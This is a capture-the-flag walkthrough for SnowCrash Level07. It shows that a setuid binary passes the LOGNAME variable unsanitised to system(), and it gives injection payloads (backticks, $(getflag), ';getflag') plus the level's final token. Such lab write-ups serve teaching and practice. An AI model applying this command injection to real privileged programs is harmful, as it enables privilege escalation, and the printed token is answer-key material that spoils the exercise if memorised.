# 🚩 SnowCrash — Level07

## 🎯 Goal

Find the password for **flag07**.

---

## 1. Check the current directory

```bash
ls -la
```

**Result:**

```
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```

A setuid binary owned by flag07.

---

## 2. Analyze the binary

Run the binary:

```bash
./level07
```

**Output:**

```
level07
```

It prints the value of the `LOGNAME` environment variable.

Use `strings` to examine the binary:

```bash
strings level07
```

**Key findings:**

```
LOGNAME
/bin/echo %s
```

**Analysis:**
- The binary reads the `LOGNAME` environment variable using `getenv("LOGNAME")`
- It constructs a command: `/bin/echo [value]`
- It executes this command using `system()`
- **Vulnerability:** No input sanitization - we can inject shell commands through the `LOGNAME` variable

---

## 3. Exploit via environment variable injection

Since the binary passes the `LOGNAME` variable directly to a shell command, we can inject our own commands using command substitution.

**Exploit:**

```bash
export LOGNAME='`getflag`'
./level07
```

**How it works:**
1. We set `LOGNAME` to `` `getflag` `` (backticks for command substitution)
2. The binary constructs: `/bin/echo `getflag``
3. The shell executes `getflag` first with **flag07** privileges
4. The output is then passed to `echo`
5. We see the token in the output

**Alternative methods:**

```bash
export LOGNAME='$(getflag)'
./level07
```

or

```bash
export LOGNAME=';getflag'
./level07
```

---

## ✅ Result

```bash
export LOGNAME='`getflag`'
./level07
```

Output:

```
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

---

## 🎉 **Final Token for Level07**

```
fiumuikeil55xe9cu4dood66h
```
